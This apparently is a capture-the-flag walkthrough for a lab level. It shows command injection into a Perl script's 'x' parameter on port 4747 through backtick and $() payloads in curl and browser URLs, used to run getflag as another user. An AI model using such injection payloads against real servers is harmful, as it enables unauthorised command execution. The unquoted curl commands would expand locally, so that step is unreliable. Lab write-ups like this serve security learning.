# Level04 Exploitation

## Objective
Exploit the web server running on `localhost:4747` to execute the `getflag` command with `flag04` permissions.

## Steps

### Step 1: Identify the Perl Script
Navigate to the `/home` directory and locate the Perl script `level04.pl`:

```bash
cd /home
cat level04.pl
```

### Step 2: Understand the Script
Examine the Perl script (`level04.pl`) to understand its functionality. Note that it prints the parameter `x` of a GET request on port `4747`.

### Step 3: Exploit the Script
Use `curl` to exploit the script and execute the `getflag` command:

```bash
curl http://localhost:4747?x=`getflag`
```

Or use the alternative syntax:

```bash
curl http://localhost:4747?x=$(getflag)
```

These commands will execute `getflag` as the user `flag04` and display the result.

### Step 4: Verify the Flag
Open a web browser and enter either of the following URLs:

- [http://192.168.56.2:4747/?x=`getflag`](http://192.168.56.2:4747/?x=`getflag`)
- [http://192.168.56.2:4747/?x=$(getflag)](http://192.168.56.2:4747/?x=$(getflag))

You should see the flag displayed.

Congratulations! You've successfully exploited the web server to execute the `getflag` command with `flag04` permissions.0
